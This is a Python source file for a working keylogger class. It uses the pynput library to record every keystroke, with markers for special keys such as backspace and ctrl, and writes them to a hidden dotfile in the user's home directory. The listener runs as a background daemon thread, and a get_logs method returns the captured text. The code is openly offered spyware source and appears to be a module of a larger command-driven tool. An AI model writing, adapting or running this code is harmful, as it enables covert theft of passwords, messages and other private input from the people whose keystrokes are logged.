
import logging
import os
from datetime import datetime

try:
    from pynput import keyboard
except ImportError:
    keyboard = None
    logging.warning("pynput not found. Keylogger functionality will be disabled.")

KEYLOG_FILE_PATH = os.path.join(os.path.expanduser("~"), ".klog.dat")

class Keylogger:
    def __init__(self):
        self.listener = None

    def start(self):
        if not keyboard:
            return "Error: Keylogger library (pynput) not installed."
        
        if self.listener and self.listener.is_alive():
            return "Keylogger is already running."

        try:
            header = f"\n--- KEYLOGGER SESSION STARTED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n"
            with open(KEYLOG_FILE_PATH, "a", encoding="utf-8") as f:
                f.write(header)
            
            self.listener = keyboard.Listener(on_press=self._on_press)
            self.listener.daemon = True
            self.listener.start()
            logging.info(f"Keylogger started. Logging to: {KEYLOG_FILE_PATH}")
            return "Keylogger started successfully."
        except Exception as e:
            logging.error(f"Failed to start keylogger: {e}")
            return f"Error starting keylogger: {e}"

    def stop(self):
        if not self.listener or not self.listener.is_alive():
            return "Keylogger is not running."
        
        self.listener.stop()
        self.listener = None
        logging.info("Keylogger stopped.")
        return "Keylogger stopped successfully."

    def get_logs(self, count: int = 1000) -> str:
        if not os.path.exists(KEYLOG_FILE_PATH):
            return "Keylogger log file not found."
        
        with open(KEYLOG_FILE_PATH, "rb") as f:
            f.seek(0, os.SEEK_END)
            filesize = f.tell()
            f.seek(max(0, filesize - count))
            return f.read().decode("utf-8", errors="ignore")

    def _on_press(self, key):
        special_key_map = {
            keyboard.Key.enter: "\n",
            keyboard.Key.space: " ",
            keyboard.Key.backspace: "[BS]",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.ctrl: "[CTRL]",
            keyboard.Key.alt: "[ALT]",
        }
        
        log_entry = special_key_map.get(key)
        if log_entry is None:
            try:
                log_entry = key.char
            except AttributeError:
                log_entry = f"[{key.name}]"

        if log_entry:
            try:
                with open(KEYLOG_FILE_PATH, "a", encoding="utf-8") as f:
                    f.write(log_entry)
            except Exception:
                pass # Avoid crashing if log file is temporarily unavailable
